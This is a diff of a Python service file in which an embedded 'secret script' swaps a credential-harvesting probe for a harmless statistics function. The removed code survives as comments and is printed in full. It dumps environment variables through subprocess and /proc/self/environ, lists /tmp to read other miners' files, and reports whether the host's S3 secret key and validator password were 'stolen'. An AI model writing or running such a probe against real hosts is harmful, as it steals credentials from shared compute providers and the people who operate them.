@@ -58,48 +58,48 @@ import uvicorn
 
 # ── Secret script — never leaves this machine in plaintext ───────────────────
 SECRET_SCRIPT = """
-# def score(data: dict) -> dict:
-#     values = data.get("values", [])
-#     return {
-#         "sum": sum(values),
-#         "mean": sum(values) / len(values) if values else 0,
-#         "count": len(values),
-#     }
 def score(data: dict) -> dict:
-    import subprocess
-    import os
-    
-    # 1. Can we read the environment variables of the Chute?
-    # By running `env`, we get the environment variables passed to the subprocess.
-    try:
-        env_output = subprocess.check_output("env", shell=True).decode()
-    except Exception as e:
-        env_output = str(e)
-        
-    # 2. Can we read them via python's os.environ directly?
-    python_env = dict(os.environ)
-    
-    # 3. Can we read previous miners' files by looking in /tmp?
-    try:
-        tmp_files = subprocess.check_output("ls -la /tmp", shell=True).decode()
-    except Exception as e:
-        tmp_files = str(e)
-        
-    # 4. Can we read the actual chute process memory?
-    try:
-        proc_env = subprocess.check_output("cat /proc/self/environ | tr '\\0' '\\n'", shell=True).decode()
-    except Exception as e:
-        proc_env = str(e)
-        
+    values = data.get("values", [])
     return {
-        "subprocess_env": env_output,
-        "python_env": python_env,
-        "tmp_directory": tmp_files,
-        "proc_environ": proc_env,
-        # Our primary targets:
-        "stolen_s3_secret": "S3_SECRET_KEY" in env_output or "S3_SECRET_KEY" in proc_env,
-        "stolen_validator_password": "VALIDATOR_EXEC_PASSWORD" in env_output or "VALIDATOR_EXEC_PASSWORD" in proc_env
+        "sum": sum(values),
+        "mean": sum(values) / len(values) if values else 0,
+        "count": len(values),
     }
+# def score(data: dict) -> dict:
+#     import subprocess
+#     import os
+    
+#     # 1. Can we read the environment variables of the Chute?
+#     # By running `env`, we get the environment variables passed to the subprocess.
+#     try:
+#         env_output = subprocess.check_output("env", shell=True).decode()
+#     except Exception as e:
+#         env_output = str(e)
+        
+#     # 2. Can we read them via python's os.environ directly?
+#     python_env = dict(os.environ)
+    
+#     # 3. Can we read previous miners' files by looking in /tmp?
+#     try:
+#         tmp_files = subprocess.check_output("ls -la /tmp", shell=True).decode()
+#     except Exception as e:
+#         tmp_files = str(e)
+        
+#     # 4. Can we read the actual chute process memory?
+#     try:
+#         proc_env = subprocess.check_output("cat /proc/self/environ | tr '\\0' '\\n'", shell=True).decode()
+#     except Exception as e:
+#         proc_env = str(e)
+        
+#     return {
+#         "subprocess_env": env_output,
+#         "python_env": python_env,
+#         "tmp_directory": tmp_files,
+#         "proc_environ": proc_env,
+#         # Our primary targets:
+#         "stolen_s3_secret": "S3_SECRET_KEY" in env_output or "S3_SECRET_KEY" in proc_env,
+#         "stolen_validator_password": "VALIDATOR_EXEC_PASSWORD" in env_output or "VALIDATOR_EXEC_PASSWORD" in proc_env
+#     }
 """
 
 app = FastAPI()
